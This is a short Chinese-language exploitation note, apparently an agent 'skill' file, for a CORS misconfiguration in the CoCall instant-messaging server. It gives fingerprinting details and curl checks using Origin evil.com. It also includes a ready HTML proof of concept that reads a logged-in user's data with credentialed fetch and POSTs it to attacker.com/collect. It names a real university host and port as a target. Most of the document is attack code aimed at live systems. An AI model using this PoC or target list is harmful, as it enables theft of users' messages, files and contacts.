# CoCall即时通讯CORS漏洞模式

## 指纹识别
```
特征端口: 65083 (HTTPS)
版本: CoCall Pro V6.2.x
框架: Vue.js v2.6.11 + Artery UI + Spring Boot
路径: /download, /forgetpwd, /interface/<tenant>/
```

## CORS漏洞验证
```bash
# 验证任意Origin被接受
curl -sI -H "Origin: https://evil.com" https://target:65083/download | grep access-control
# 返回:
# access-control-allow-origin: https://evil.com
# access-control-allow-credentials: true

# 测试null Origin
curl -sI -H "Origin: null" https://target:65083/download | grep access-control
# 返回: access-control-allow-origin: null

# 批量验证
for origin in "https://evil.com" "http://evil.com" "https://attacker.com" "null"; do
  curl -sI -H "Origin: $origin" https://target:65083/download | grep access-control-allow-origin
done
```

## 攻击场景
1. 攻击者创建恶意网页
2. 用户(CoCall已登录)访问恶意网页
3. 恶意网页通过fetch() + credentials:'include'发起CORS请求
4. 浏览器携带用户Cookie发送请求到CoCall服务器
5. CoCall服务器返回数据(因为Origin被反射)
6. 攻击者读取用户消息/文件/联系人

## PoC模板
```html
<script>
fetch('https://target:65083/api/user/info', {
  credentials: 'include',
  headers: {'Content-Type': 'application/json'}
})
.then(r => r.json())
.then(data => {
  // 发送到攻击者服务器
  fetch('https://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
</script>
```

## 教育行业常见目标
CoCall在教育行业广泛使用，常与联奕CAS集成:
- 新疆交通职业技术大学 (www.xjjtedu.cn:65083)
- 其他使用联奕CAS的高校

## 参考
- 详见 `lianyi-cas-exploitation-patterns` skill的完整CoCall章节
